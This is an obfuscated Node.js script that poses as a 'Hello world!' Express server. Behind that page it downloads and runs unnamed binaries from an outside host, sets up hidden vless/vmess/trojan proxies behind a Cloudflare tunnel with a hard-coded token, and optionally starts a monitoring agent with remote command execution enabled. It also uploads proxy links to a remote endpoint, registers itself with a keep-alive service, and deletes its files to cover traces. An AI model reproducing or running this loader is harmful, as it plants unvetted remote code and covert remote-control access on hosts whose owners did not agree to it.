const _0x2fab85=_0x16f0;(function(_0x5ef915,_0x3794ec){const _0xff0230=_0x16f0,_0x507316=_0x5ef915();while(!![]){try{const _0x4d8948=parseInt(_0xff0230(0x1a8))/0x1*(-parseInt(_0xff0230(0x14b))/0x2)+parseInt(_0xff0230(0x157))/0x3+-parseInt(_0xff0230(0x1a4))/0x4*(-parseInt(_0xff0230(0x1dd))/0x5)+parseInt(_0xff0230(0x15c))/0x6*(-parseInt(_0xff0230(0x1ff))/0x7)+parseInt(_0xff0230(0x151))/0x8*(-parseInt(_0xff0230(0x17b))/0x9)+-parseInt(_0xff0230(0x147))/0xa*(parseInt(_0xff0230(0x18c))/0xb)+parseInt(_0xff0230(0x1f3))/0xc*(parseInt(_0xff0230(0x14f))/0xd);if(_0x4d8948===_0x3794ec)break;else _0x507316['push'](_0x507316['shift']());}catch(_0x22d5c0){_0x507316['push'](_0x507316['shift']());}}}(_0x10aa,0x23ec4));const express=require(_0x2fab85(0x185)),app=express(),axios=require(_0x2fab85(0x173)),os=require('os'),fs=require('fs'),path=require(_0x2fab85(0x1b6)),{promisify}=require(_0x2fab85(0x163)),exec=promisify(require(_0x2fab85(0x1a3))[_0x2fab85(0x1a5)]),{execSync}=require(_0x2fab85(0x1a3)),UPLOAD_URL=process['env'][_0x2fab85(0x144)]||'',PROJECT_URL=process[_0x2fab85(0x1c2)][_0x2fab85(0x192)]||'',AUTO_ACCESS=process[_0x2fab85(0x1c2)][_0x2fab85(0x14d)]||![],FILE_PATH=process[_0x2fab85(0x1c2)][_0x2fab85(0x1cf)]||'./tmp',SUB_PATH=process[_0x2fab85(0x1c2)]['SUB_PATH']||_0x2fab85(0x1a6),PORT=process[_0x2fab85(0x1c2)][_0x2fab85(0x1c3)]||process['env'][_0x2fab85(0x1e2)]||0xbb8,UUID=process['env'][_0x2fab85(0x175)]||_0x2fab85(0x15d),NEZHA_SERVER=process[_0x2fab85(0x1c2)]['NEZHA_SERVER']||'',NEZHA_PORT=process[_0x2fab85(0x1c2)][_0x2fab85(0x1fd)]||'',NEZHA_KEY=process[_0x2fab85(0x1c2)][_0x2fab85(0x179)]||'',ARGO_DOMAIN=process['env'][_0x2fab85(0x1a1)]||_0x2fab85(0x16f),ARGO_AUTH=process[_0x2fab85(0x1c2)][_0x2fab85(0x161)]||_0x2fab85(0x17f),ARGO_PORT=process[_0x2fab85(0x1c2)][_0x2fab85(0x19e)]||0x1f41,CFIP=process[_0x2fab85(0x1c2)][_0x2fab85(0x18f)]||_0x2fab85(0x176),CFPORT=process[_0x2fab85(0x1c2)][_0x2fab85(0x1c0)]||0x1bb,NAME=process[_0x2fab85(0x1c2)]['NAME']||'';!fs['existsSync'](FILE_PATH)?(fs[_0x2fab85(0x1fb)](FILE_PATH),console[_0x2fab85(0x1ce)](FILE_PATH+_0x2fab85(0x1cd))):console[_0x2fab85(0x1ce)](FILE_PATH+_0x2fab85(0x1ef));function generateRandomName(){const _0x4f9a00=_0x2fab85,_0x53f43e='abcdefghijklmnopqrstuvwxyz';let _0x2b5ee5='';for(let _0x21ded4=0x0;_0x21ded4<0x6;_0x21ded4++){_0x2b5ee5+=_0x53f43e['charAt'](Math[_0x4f9a00(0x1b3)](Math[_0x4f9a00(0x195)]()*_0x53f43e['length']));}return _0x2b5ee5;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path[_0x2fab85(0x14e)](FILE_PATH,npmName),phpPath=path[_0x2fab85(0x14e)](FILE_PATH,phpName),webPath=path[_0x2fab85(0x14e)](FILE_PATH,webName),botPath=path[_0x2fab85(0x14e)](FILE_PATH,botName),subPath=path[_0x2fab85(0x14e)](FILE_PATH,_0x2fab85(0x169)),listPath=path[_0x2fab85(0x14e)](FILE_PATH,'list.txt'),bootLogPath=path[_0x2fab85(0x14e)](FILE_PATH,_0x2fab85(0x156)),configPath=path[_0x2fab85(0x14e)](FILE_PATH,_0x2fab85(0x1e7));function deleteNodes(){const _0x249cf7=_0x2fab85;try{if(!UPLOAD_URL)return;if(!fs['existsSync'](subPath))return;let _0x536c88;try{_0x536c88=fs[_0x249cf7(0x165)](subPath,_0x249cf7(0x18b));}catch{return null;}const _0x25285b=Buffer[_0x249cf7(0x168)](_0x536c88,_0x249cf7(0x193))['toString'](_0x249cf7(0x18b)),_0x3aea4a=_0x25285b['split']('\x0a')[_0x249cf7(0x1b9)](_0x3ba9d8=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x249cf7(0x1c9)](_0x3ba9d8));if(_0x3aea4a['length']===0x0)return;return axios[_0x249cf7(0x190)](UPLOAD_URL+_0x249cf7(0x159),JSON[_0x249cf7(0x17e)]({'nodes':_0x3aea4a}),{'headers':{'Content-Type':_0x249cf7(0x1d7)}})[_0x249cf7(0x19a)](_0x34ff0c=>{return null;}),null;}catch(_0x229a52){return null;}}function cleanupOldFiles(){try{const _0x2ce707=fs['readdirSync'](FILE_PATH);_0x2ce707['forEach'](_0x41e55b=>{const _0xdf7f5c=_0x16f0,_0x23ceda=path[_0xdf7f5c(0x14e)](FILE_PATH,_0x41e55b);try{const _0x2329ef=fs['statSync'](_0x23ceda);_0x2329ef['isFile']()&&fs[_0xdf7f5c(0x199)](_0x23ceda);}catch(_0x1d2528){}});}catch(_0x2eef9c){}}app[_0x2fab85(0x1a9)]('/',function(_0xf60e85,_0x2f96db){const _0x3851de=_0x2fab85;_0x2f96db[_0x3851de(0x1b7)]('Hello\x20world!');});function _0x16f0(_0x19807c,_0x3ccbf5){_0x19807c=_0x19807c-0x13e;const _0x10aa27=_0x10aa();let _0x16f05a=_0x10aa27[_0x19807c];return _0x16f05a;}async function generateConfig(){const _0x5bb779=_0x2fab85,_0x243238={'log':{'access':'/dev/null','error':_0x5bb779(0x1f7),'loglevel':_0x5bb779(0x140)},'inbounds':[{'port':ARGO_PORT,'protocol':'vless','settings':{'clients':[{'id':UUID,'flow':'xtls-rprx-vision'}],'decryption':_0x5bb779(0x140),'fallbacks':[{'dest':0xbb9},{'path':_0x5bb779(0x14c),'dest':0xbba},{'path':_0x5bb779(0x1ba),'dest':0xbbb},{'path':'/trojan-argo','dest':0xbbc}]},'streamSettings':{'network':_0x5bb779(0x1bb)}},{'port':0xbb9,'listen':_0x5bb779(0x1da),'protocol':'vless','settings':{'clients':[{'id':UUID}],'decryption':_0x5bb779(0x140)},'streamSettings':{'network':_0x5bb779(0x1bb),'security':_0x5bb779(0x140)}},{'port':0xbba,'listen':'127.0.0.1','protocol':_0x5bb779(0x186),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x5bb779(0x140)},'streamSettings':{'network':'ws','security':_0x5bb779(0x140),'wsSettings':{'path':_0x5bb779(0x14c)}},'sniffing':{'enabled':!![],'destOverride':['http','tls',_0x5bb779(0x1fa)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x5bb779(0x1da),'protocol':'vmess','settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x5bb779(0x1ba)}},'sniffing':{'enabled':!![],'destOverride':[_0x5bb779(0x1ae),_0x5bb779(0x1d3),'quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x5bb779(0x1da),'protocol':_0x5bb779(0x1a7),'settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':'none','wsSettings':{'path':_0x5bb779(0x174)}},'sniffing':{'enabled':!![],'destOverride':[_0x5bb779(0x1ae),'tls','quic'],'metadataOnly':![]}}],'dns':{'servers':[_0x5bb779(0x182)]},'outbounds':[{'protocol':_0x5bb779(0x1b2),'tag':_0x5bb779(0x13f)},{'protocol':_0x5bb779(0x142),'tag':_0x5bb779(0x160)}]};fs[_0x5bb779(0x1a2)](path['join'](FILE_PATH,_0x5bb779(0x1e7)),JSON[_0x5bb779(0x17e)](_0x243238,null,0x2));}function getSystemArchitecture(){const _0xc228b5=_0x2fab85,_0x5e2615=os[_0xc228b5(0x1ee)]();return _0x5e2615===_0xc228b5(0x16c)||_0x5e2615===_0xc228b5(0x1f8)||_0x5e2615===_0xc228b5(0x1e4)?_0xc228b5(0x16c):_0xc228b5(0x1a0);}function _0x10aa(){const _0x536d70=['response','length','from','sub.txt','npm\x20running\x20error:\x20','\x0a\x20\x20\x0avmess://','arm','pipe','\x20>/dev/null\x202>&1','railwaysg.xiangyu-group.com.cn','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','error','2096','axios','/trojan-argo','UUID','saas.sin.fan','?security=tls&sni=','toString','NEZHA_KEY','fileUrl','18tcEoOh','stream','\x22\x20>\x20/dev/null\x202>&1','stringify','eyJhIjoiODMzODQxZDFjYzE3MzEyYjZmZDkwNjBiZjdjNDY5MmMiLCJ0IjoiNzliZjU1MmItZTc2ZC00YTQwLWJjYjItZGY1MjhmZDgxYWQ5IiwicyI6IllUSTFOalEwWVRZdFlUUXlOUzAwT1RFekxXRmxZall0TVdZM09URmtOVFV4T1dNeiJ9','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','nohup\x20','https+local://8.8.8.8/dns-query','&path=%2Ftrojan-argo%3Fed%3D2560#','set','express','vless','chmod','firefox','Add\x20automatic\x20access\x20task\x20faild:\x20','message','utf-8','2387mgLryX','Empowerment\x20success\x20for\x20','all','CFIP','post','tunnel.json','PROJECT_URL','base64','status','random','\x20is\x20running','tunnel.yml','createWriteStream','unlinkSync','catch','8443','https://amd64.ssss.nyc.mn/web','\x0a\x20\x20\x20\x20','ARGO_PORT','del\x20/f\x20/q\x20','amd','ARGO_DOMAIN','writeFileSync','child_process','12696EJLQBW','exec','sub','trojan','41DhIQrd','get','has','2083','https://amd64.ssss.nyc.mn/agent','includes','http','split','Subscription\x20uploaded\x20successfully','https://arm64.ssss.nyc.mn/web','freedom','floor','https://arm64.ssss.nyc.mn/bot','Error\x20executing\x20command:\x20','path','send','map','filter','/vmess-argo','tcp','existsSync','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','443','/vmess-argo?ed=2560','CFPORT','platform','env','SERVER_PORT','web\x20running\x20error:\x20','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','close','2053','\x20-s\x20','test','--tls','basename','http\x20server\x20is\x20running\x20on\x20port:','\x20is\x20created','log','FILE_PATH','Empowerment\x20failed\x20for\x20','fileName','&fp=firefox&type=ws&host=','tls','Error\x20downloading\x20files:','data','/config.json\x20>/dev/null\x202>&1\x20&','application/json','unlink','pop','127.0.0.1','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','automatic\x20access\x20task\x20added\x20successfully','280nnMrNQ','Content-Type','Error\x20in\x20startserver:','rm\x20-rf\x20','https://arm64.ssss.nyc.mn/agent','PORT','Unhandled\x20error\x20in\x20startserver:','aarch64','curl\x20-sm\x205\x20https://speed.cloudflare.com/meta\x20|\x20awk\x20-F\x5c\x22\x20\x27{print\x20$26\x22-\x22$18}\x27\x20|\x20sed\x20-e\x20\x27s/\x20/_/g\x27','ARGO_DOMAIN:','config.json','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','match','/tunnel.yml\x20run','then','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','https://arm64.ssss.nyc.mn/v1','arch','\x20already\x20exists','TunnelSecret','\x20-c\x20','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','4476mRLLlI','substring','&path=%2Fvless-argo%3Fed%3D2560#','win32','/dev/null','arm64','unshift','quic','mkdirSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','NEZHA_PORT','.exe\x20>\x20nul\x202>&1','596407finEyB','\x0a\x20\x20\x0atrojan://','direct','none','\x20-p\x20','blackhole','\x0a\x20\x20tunnel:\x20','UPLOAD_URL','php\x20running\x20error:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','8190ovylLg','2087','\x20successfully','clear','8918PDohJQ','/vless-argo','AUTO_ACCESS','join','12662ohqZmX','push','331600hETzwk','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','\x20>\x20nul\x202>&1','\x0avless://','pkill\x20-f\x20\x22[','boot.log','404211WKseqF','charAt','/api/delete-nodes','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','Error\x20reading\x20boot.log:','6oeFZfg','bc97f674-c578-4940-9234-0a1da46041b9','/api/add-nodes','Download\x20','block','ARGO_AUTH','true','util','?encryption=none&security=tls&sni=','readFileSync'];_0x10aa=function(){return _0x536d70;};return _0x10aa();}function downloadFile(_0x374532,_0x3f65fe,_0x1050a2){const _0x52fb1b=_0x2fab85,_0x26e72b=_0x374532;!fs[_0x52fb1b(0x1bc)](FILE_PATH)&&fs['mkdirSync'](FILE_PATH,{'recursive':!![]});const _0x1c9ab8=fs[_0x52fb1b(0x198)](_0x26e72b);axios({'method':_0x52fb1b(0x1a9),'url':_0x3f65fe,'responseType':_0x52fb1b(0x17c)})[_0x52fb1b(0x1eb)](_0x311c21=>{const _0xc26954=_0x52fb1b;_0x311c21[_0xc26954(0x1d5)][_0xc26954(0x16d)](_0x1c9ab8),_0x1c9ab8['on']('finish',()=>{const _0x396f3f=_0xc26954;_0x1c9ab8[_0x396f3f(0x1c6)](),console[_0x396f3f(0x1ce)]('Download\x20'+path['basename'](_0x26e72b)+_0x396f3f(0x149)),_0x1050a2(null,_0x26e72b);}),_0x1c9ab8['on'](_0xc26954(0x171),_0xd3edd1=>{const _0x5c10df=_0xc26954;fs[_0x5c10df(0x1d8)](_0x26e72b,()=>{});const _0x231a5c=_0x5c10df(0x15f)+path['basename'](_0x26e72b)+'\x20failed:\x20'+_0xd3edd1['message'];console['error'](_0x231a5c),_0x1050a2(_0x231a5c);});})[_0x52fb1b(0x19a)](_0x1707ff=>{const _0x41267e=_0x52fb1b,_0x1982db=_0x41267e(0x15f)+path[_0x41267e(0x1cb)](_0x26e72b)+'\x20failed:\x20'+_0x1707ff['message'];console['error'](_0x1982db),_0x1050a2(_0x1982db);});}async function downloadFilesAndRun(){const _0x25b401=_0x2fab85,_0xa4a5b9=getSystemArchitecture(),_0x12dd9d=getFilesForArchitecture(_0xa4a5b9);if(_0x12dd9d['length']===0x0){console['log']('Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture');return;}const _0x2b5519=_0x12dd9d[_0x25b401(0x1b8)](_0x2fa503=>{return new Promise((_0x523a86,_0x521230)=>{const _0x209bfb=_0x16f0;downloadFile(_0x2fa503[_0x209bfb(0x1d1)],_0x2fa503[_0x209bfb(0x17a)],(_0x300927,_0x480773)=>{_0x300927?_0x521230(_0x300927):_0x523a86(_0x480773);});});});try{await Promise[_0x25b401(0x18e)](_0x2b5519);}catch(_0x2239b6){console[_0x25b401(0x171)](_0x25b401(0x1d4),_0x2239b6);return;}function _0x4da2fe(_0xa926de){const _0x17ffc7=0x1fd;_0xa926de['forEach'](_0x28bf41=>{const _0x50c33a=_0x16f0;fs['existsSync'](_0x28bf41)&&fs[_0x50c33a(0x187)](_0x28bf41,_0x17ffc7,_0x584912=>{const _0x5ed17d=_0x50c33a;_0x584912?console['error'](_0x5ed17d(0x1d0)+_0x28bf41+':\x20'+_0x584912):console['log'](_0x5ed17d(0x18d)+_0x28bf41+':\x20'+_0x17ffc7[_0x5ed17d(0x178)](0x8));});});}const _0x468d60=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x4da2fe(_0x468d60);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x3baa39=NEZHA_SERVER[_0x25b401(0x1ad)](':')?NEZHA_SERVER['split'](':')[_0x25b401(0x1d9)]():'',_0x44bda0=new Set(['443',_0x25b401(0x19b),_0x25b401(0x172),'2087',_0x25b401(0x1ab),_0x25b401(0x1c7)]),_0x56fab7=_0x44bda0[_0x25b401(0x1aa)](_0x3baa39)?_0x25b401(0x162):'false',_0x5e8f4c='\x0aclient_secret:\x20'+NEZHA_KEY+_0x25b401(0x1e8)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x56fab7+_0x25b401(0x1bd)+UUID;fs[_0x25b401(0x1a2)](path['join'](FILE_PATH,'config.yaml'),_0x5e8f4c);const _0x8d2503=_0x25b401(0x181)+phpPath+'\x20-c\x20\x22'+FILE_PATH+_0x25b401(0x1c5);try{await exec(_0x8d2503),console[_0x25b401(0x1ce)](phpName+_0x25b401(0x196)),await new Promise(_0x3b7e88=>setTimeout(_0x3b7e88,0x3e8));}catch(_0x12eaea){console[_0x25b401(0x171)](_0x25b401(0x145)+_0x12eaea);}}else{let _0x1636c3='';const _0x26dabf=[_0x25b401(0x1be),_0x25b401(0x19b),_0x25b401(0x172),_0x25b401(0x148),_0x25b401(0x1ab),'2053'];_0x26dabf[_0x25b401(0x1ad)](NEZHA_PORT)&&(_0x1636c3=_0x25b401(0x1ca));const _0xc39e6b=_0x25b401(0x181)+npmPath+_0x25b401(0x1c8)+NEZHA_SERVER+':'+NEZHA_PORT+_0x25b401(0x141)+NEZHA_KEY+'\x20'+_0x1636c3+_0x25b401(0x1db);try{await exec(_0xc39e6b),console[_0x25b401(0x1ce)](npmName+'\x20is\x20running'),await new Promise(_0x5bc740=>setTimeout(_0x5bc740,0x3e8));}catch(_0x31ca90){console[_0x25b401(0x171)](_0x25b401(0x16a)+_0x31ca90);}}}else console[_0x25b401(0x1ce)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x49e6de='nohup\x20'+webPath+_0x25b401(0x1f1)+FILE_PATH+_0x25b401(0x1d6);try{await exec(_0x49e6de),console[_0x25b401(0x1ce)](webName+_0x25b401(0x196)),await new Promise(_0xd9b250=>setTimeout(_0xd9b250,0x3e8));}catch(_0x3262b8){console[_0x25b401(0x171)](_0x25b401(0x1c4)+_0x3262b8);}if(fs[_0x25b401(0x1bc)](botPath)){let _0x35d915;if(ARGO_AUTH[_0x25b401(0x1e9)](/^[A-Z0-9a-z=]{120,250}$/))_0x35d915='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20'+ARGO_AUTH;else ARGO_AUTH[_0x25b401(0x1e9)](/TunnelSecret/)?_0x35d915='tunnel\x20--edge-ip-version\x20auto\x20--config\x20'+FILE_PATH+_0x25b401(0x1ea):_0x35d915='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+_0x25b401(0x1ec)+ARGO_PORT;try{await exec(_0x25b401(0x181)+botPath+'\x20'+_0x35d915+'\x20>/dev/null\x202>&1\x20&'),console[_0x25b401(0x1ce)](botName+_0x25b401(0x196)),await new Promise(_0x2c5f67=>setTimeout(_0x2c5f67,0x7d0));}catch(_0x5141ac){console['error'](_0x25b401(0x1b5)+_0x5141ac);}}await new Promise(_0x4f250f=>setTimeout(_0x4f250f,0x1388));}function getFilesForArchitecture(_0x38bc92){const _0x5725b0=_0x2fab85;let _0x503f8c;_0x38bc92===_0x5725b0(0x16c)?_0x503f8c=[{'fileName':webPath,'fileUrl':_0x5725b0(0x1b1)},{'fileName':botPath,'fileUrl':_0x5725b0(0x1b4)}]:_0x503f8c=[{'fileName':webPath,'fileUrl':_0x5725b0(0x19c)},{'fileName':botPath,'fileUrl':'https://amd64.ssss.nyc.mn/bot'}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x2bea37=_0x38bc92===_0x5725b0(0x16c)?_0x5725b0(0x1e1):_0x5725b0(0x1ac);_0x503f8c[_0x5725b0(0x1f9)]({'fileName':npmPath,'fileUrl':_0x2bea37});}else{const _0x73c5ae=_0x38bc92===_0x5725b0(0x16c)?_0x5725b0(0x1ed):'https://amd64.ssss.nyc.mn/v1';_0x503f8c[_0x5725b0(0x1f9)]({'fileName':phpPath,'fileUrl':_0x73c5ae});}}return _0x503f8c;}function argoType(){const _0x3d0dfd=_0x2fab85;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x3d0dfd(0x1ce)]('ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels');return;}if(ARGO_AUTH[_0x3d0dfd(0x1ad)](_0x3d0dfd(0x1f0))){fs[_0x3d0dfd(0x1a2)](path[_0x3d0dfd(0x14e)](FILE_PATH,_0x3d0dfd(0x191)),ARGO_AUTH);const _0x5c5e1f=_0x3d0dfd(0x143)+ARGO_AUTH[_0x3d0dfd(0x1af)]('\x22')[0xb]+'\x0a\x20\x20credentials-file:\x20'+path[_0x3d0dfd(0x14e)](FILE_PATH,_0x3d0dfd(0x191))+_0x3d0dfd(0x152)+ARGO_DOMAIN+_0x3d0dfd(0x1f2)+ARGO_PORT+_0x3d0dfd(0x15a);fs[_0x3d0dfd(0x1a2)](path[_0x3d0dfd(0x14e)](FILE_PATH,_0x3d0dfd(0x197)),_0x5c5e1f);}else console[_0x3d0dfd(0x1ce)](_0x3d0dfd(0x1fc));}argoType();async function extractDomains(){const _0x4da307=_0x2fab85;let _0x2e9049;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2e9049=ARGO_DOMAIN,console[_0x4da307(0x1ce)](_0x4da307(0x1e6),_0x2e9049),await _0x5ee776(_0x2e9049);else try{const _0x31e3d3=fs[_0x4da307(0x165)](path[_0x4da307(0x14e)](FILE_PATH,'boot.log'),_0x4da307(0x18b)),_0x47e5de=_0x31e3d3[_0x4da307(0x1af)]('\x0a'),_0xa040d5=[];_0x47e5de['forEach'](_0x41a7f6=>{const _0x49e8c8=_0x4da307,_0x13d4a2=_0x41a7f6['match'](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x13d4a2){const _0x4b4f8a=_0x13d4a2[0x1];_0xa040d5[_0x49e8c8(0x150)](_0x4b4f8a);}});if(_0xa040d5[_0x4da307(0x167)]>0x0)_0x2e9049=_0xa040d5[0x0],console[_0x4da307(0x1ce)]('ArgoDomain:',_0x2e9049),await _0x5ee776(_0x2e9049);else{console['log'](_0x4da307(0x146)),fs['unlinkSync'](path[_0x4da307(0x14e)](FILE_PATH,_0x4da307(0x156)));async function _0x5f0eda(){const _0x3a9972=_0x4da307;try{process['platform']==='win32'?await exec('taskkill\x20/f\x20/im\x20'+botName+_0x3a9972(0x1fe)):await exec(_0x3a9972(0x155)+botName[_0x3a9972(0x158)](0x0)+']'+botName[_0x3a9972(0x1f4)](0x1)+_0x3a9972(0x17d));}catch(_0xbc9a78){}}_0x5f0eda(),await new Promise(_0x3c4bc9=>setTimeout(_0x3c4bc9,0xbb8));const _0x31297c=_0x4da307(0x170)+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x4da307(0x181)+botPath+'\x20'+_0x31297c+'\x20>/dev/null\x202>&1\x20&'),console[_0x4da307(0x1ce)](botName+_0x4da307(0x196)),await new Promise(_0xf3494e=>setTimeout(_0xf3494e,0xbb8)),await extractDomains();}catch(_0x3b1324){console[_0x4da307(0x171)]('Error\x20executing\x20command:\x20'+_0x3b1324);}}}catch(_0x5d0f2e){console['error'](_0x4da307(0x15b),_0x5d0f2e);}async function _0x5ee776(_0x153cc7){const _0x3fd471=_0x4da307,_0xa63494=execSync(_0x3fd471(0x1e5),{'encoding':_0x3fd471(0x18b)}),_0x4d3fa6=_0xa63494['trim'](),_0x38d239=NAME?NAME+'-'+_0x4d3fa6:_0x4d3fa6;return new Promise(_0x5e3adf=>{setTimeout(()=>{const _0xf625d=_0x16f0,_0x51c43a={'v':'2','ps':''+_0x38d239,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0xf625d(0x140),'net':'ws','type':_0xf625d(0x140),'host':_0x153cc7,'path':_0xf625d(0x1bf),'tls':_0xf625d(0x1d3),'sni':_0x153cc7,'alpn':'','fp':_0xf625d(0x188)},_0x51a39e=_0xf625d(0x154)+UUID+'@'+CFIP+':'+CFPORT+_0xf625d(0x164)+_0x153cc7+'&fp=firefox&type=ws&host='+_0x153cc7+_0xf625d(0x1f5)+_0x38d239+_0xf625d(0x16b)+Buffer[_0xf625d(0x168)](JSON['stringify'](_0x51c43a))[_0xf625d(0x178)](_0xf625d(0x193))+_0xf625d(0x13e)+UUID+'@'+CFIP+':'+CFPORT+_0xf625d(0x177)+_0x153cc7+_0xf625d(0x1d2)+_0x153cc7+_0xf625d(0x183)+_0x38d239+_0xf625d(0x19d);console[_0xf625d(0x1ce)](Buffer[_0xf625d(0x168)](_0x51a39e)['toString'](_0xf625d(0x193))),fs[_0xf625d(0x1a2)](subPath,Buffer[_0xf625d(0x168)](_0x51a39e)['toString'](_0xf625d(0x193))),console[_0xf625d(0x1ce)](FILE_PATH+'/sub.txt\x20saved\x20successfully'),uploadNodes(),app[_0xf625d(0x1a9)]('/'+SUB_PATH,(_0x31574d,_0x247554)=>{const _0xdb83f5=_0xf625d,_0x149d09=Buffer[_0xdb83f5(0x168)](_0x51a39e)[_0xdb83f5(0x178)]('base64');_0x247554[_0xdb83f5(0x184)](_0xdb83f5(0x1de),'text/plain;\x20charset=utf-8'),_0x247554[_0xdb83f5(0x1b7)](_0x149d09);}),_0x5e3adf(_0x51a39e);},0x7d0);});}}async function uploadNodes(){const _0x2334a7=_0x2fab85;if(UPLOAD_URL&&PROJECT_URL){const _0x17bf1c=PROJECT_URL+'/'+SUB_PATH,_0x1acf38={'subscription':[_0x17bf1c]};try{const _0x152676=await axios[_0x2334a7(0x190)](UPLOAD_URL+'/api/add-subscriptions',_0x1acf38,{'headers':{'Content-Type':_0x2334a7(0x1d7)}});return _0x152676&&_0x152676[_0x2334a7(0x194)]===0xc8?(console['log'](_0x2334a7(0x1b0)),_0x152676):null;}catch(_0x5229a5){if(_0x5229a5[_0x2334a7(0x166)]){if(_0x5229a5['response']['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x2334a7(0x1bc)](listPath))return;const _0x43e139=fs[_0x2334a7(0x165)](listPath,_0x2334a7(0x18b)),_0x244d2d=_0x43e139['split']('\x0a')[_0x2334a7(0x1b9)](_0x5b49b9=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x2334a7(0x1c9)](_0x5b49b9));if(_0x244d2d['length']===0x0)return;const _0x1934c6=JSON['stringify']({'nodes':_0x244d2d});try{const _0x44768d=await axios['post'](UPLOAD_URL+_0x2334a7(0x15e),_0x1934c6,{'headers':{'Content-Type':_0x2334a7(0x1d7)}});return _0x44768d&&_0x44768d[_0x2334a7(0x194)]===0xc8?(console[_0x2334a7(0x1ce)]('Nodes\x20uploaded\x20successfully'),_0x44768d):null;}catch(_0x126a10){return null;}}else return;}}function cleanFiles(){setTimeout(()=>{const _0x4a69f5=_0x16f0,_0x583403=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x583403[_0x4a69f5(0x150)](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x583403[_0x4a69f5(0x150)](phpPath);process[_0x4a69f5(0x1c1)]===_0x4a69f5(0x1f6)?exec(_0x4a69f5(0x19f)+_0x583403[_0x4a69f5(0x14e)]('\x20')+_0x4a69f5(0x153),_0x52034e=>{const _0x2ceac2=_0x4a69f5;console[_0x2ceac2(0x14a)](),console[_0x2ceac2(0x1ce)]('App\x20is\x20running'),console[_0x2ceac2(0x1ce)](_0x2ceac2(0x180));}):exec(_0x4a69f5(0x1e0)+_0x583403[_0x4a69f5(0x14e)]('\x20')+_0x4a69f5(0x16e),_0x110cff=>{const _0x5c09c5=_0x4a69f5;console['clear'](),console['log']('App\x20is\x20running'),console[_0x5c09c5(0x1ce)](_0x5c09c5(0x180));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3ba316=_0x2fab85;if(!AUTO_ACCESS||!PROJECT_URL){console[_0x3ba316(0x1ce)]('Skipping\x20adding\x20automatic\x20access\x20task');return;}try{const _0x23357c=await axios[_0x3ba316(0x190)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0x3ba316(0x1d7)}});return console[_0x3ba316(0x1ce)](_0x3ba316(0x1dc)),_0x23357c;}catch(_0xcabb80){return console[_0x3ba316(0x171)](_0x3ba316(0x189)+_0xcabb80[_0x3ba316(0x18a)]),null;}}async function startserver(){const _0x224528=_0x2fab85;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x4ce6d5){console[_0x224528(0x171)](_0x224528(0x1df),_0x4ce6d5);}}startserver()[_0x2fab85(0x19a)](_0x13645e=>{const _0x2856ea=_0x2fab85;console[_0x2856ea(0x171)](_0x2856ea(0x1e3),_0x13645e);}),app['listen'](PORT,()=>console[_0x2fab85(0x1ce)](_0x2fab85(0x1cc)+PORT+'!'));
